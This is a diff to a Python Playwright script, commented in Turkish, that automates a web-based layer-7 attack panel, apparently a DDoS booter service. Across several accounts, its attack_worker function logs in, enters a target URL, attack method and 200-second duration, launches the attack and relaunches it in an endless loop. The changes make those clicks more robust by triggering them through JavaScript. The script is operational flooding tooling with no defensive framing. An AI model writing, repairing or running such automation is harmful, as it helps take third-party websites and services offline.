@@ -89,7 +89,6 @@ def attack_worker(account):
                     page.fill("#username", username)
                     page.fill("#password", password)
                     
-                    # Giriş butonunu bekle ve tıkla (kararsızsa JavaScript ile tıkla)
                     page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=30000)
                     try:
                         page.click("#loginNextBtn", timeout=10000)
@@ -116,7 +115,8 @@ def attack_worker(account):
                     
                     # #layer_7'yi bekle ve tıkla
                     page.wait_for_selector("#layer_7", timeout=20000)
-                    page.locator("#layer_7").click()
+                    # Tıklama işlemini JavaScript ile yap (daha sağlam)
+                    page.evaluate("document.getElementById('layer_7').click()")
                     print(f"[{username}] ✅ #layer_7 tıklandı.")
                     page.wait_for_timeout(2000)
                     consecutive_errors = 0
@@ -132,30 +132,29 @@ def attack_worker(account):
                 # ---------- ANA SALDIRI DÖNGÜSÜ (SONSUZ) ----------
                 while True:
                     try:
-                        # Form elemanlarının görünür olmasını bekle
+                        # Önce #l7host elementinin görünmesini bekle
                         page.wait_for_selector("#l7host", timeout=20000)
-                        page.wait_for_selector("#l7method", timeout=10000)
-                        page.wait_for_selector("#l7time", timeout=10000)
-                        page.wait_for_selector("#l7btn", timeout=20000)
                         
                         # Formu doldur
                         page.fill("#l7host", target_url)
                         page.select_option("#l7method", value=method)
-                        page.fill("#l7time", "200")  # Sabit 200 saniye
+                        page.fill("#l7time", "200")  # 200 saniye
                         
-                        # Başlat butonuna tıkla (görünür olana kadar bekle)
-                        page.click("#l7btn", timeout=15000)
+                        # Butonun görünmesini bekle ve tıkla (JS ile)
+                        page.wait_for_selector("#l7btn-attack", timeout=20000)
+                        page.evaluate("document.getElementById('l7btn-attack').click()")
                         print(f"[{username}] 🔥 Saldırı başladı | 200 sn")
                         consecutive_errors = 0
 
                         # Saldırı durumu takibi
                         while True:
-                            # Sayfadaki saldırı durumunu kontrol et
+                            # "No running attacks" yazısı var mı?
                             no_attacks = page.locator(".dataTables_empty:has-text('No running attacks')")
                             if no_attacks.count() > 0 and no_attacks.is_visible():
-                                print(f"[{username}] ⏰ Saldırı bitti.")
+                                print(f"[{username}] ⏰ Saldırı bitti (No running attacks).")
                                 break
                             
+                            # Süre bilgisi var mı?
                             expire_cell = page.locator("#attacks-table tbody tr td:nth-child(4) span").first
                             if expire_cell.count() > 0:
                                 expire_text = expire_cell.text_content().strip()
@@ -163,7 +162,7 @@ def attack_worker(account):
                                     print(f"[{username}] ⏰ Süre doldu.")
                                     break
                             
-                            # Saldırı devam ediyor mu kontrol et
+                            # "Running" yazısı kayboldu mu?
                             running_badge = page.locator(".stats-content .badge:has-text('Running')").first
                             if running_badge.count() == 0:
                                 print(f"[{username}] ⏰ Attack bitti (Running yok).")
@@ -178,7 +177,7 @@ def attack_worker(account):
                         
                         # #layer_7'ye tekrar tıkla
                         page.wait_for_selector("#layer_7", timeout=15000)
-                        page.locator("#layer_7").click()
+                        page.evaluate("document.getElementById('layer_7').click()")
                         page.wait_for_timeout(2000)
 
                     except Exception as inner_err:
@@ -188,9 +187,8 @@ def attack_worker(account):
                             # Sayfayı yenile ve tekrar dene
                             page.reload(wait_until="load")
                             page.wait_for_timeout(5000)
-                            # #layer_7'ye tıkla
                             page.wait_for_selector("#layer_7", timeout=15000)
-                            page.locator("#layer_7").click()
+                            page.evaluate("document.getElementById('layer_7').click()")
                             page.wait_for_timeout(2000)
                         except:
                             pass
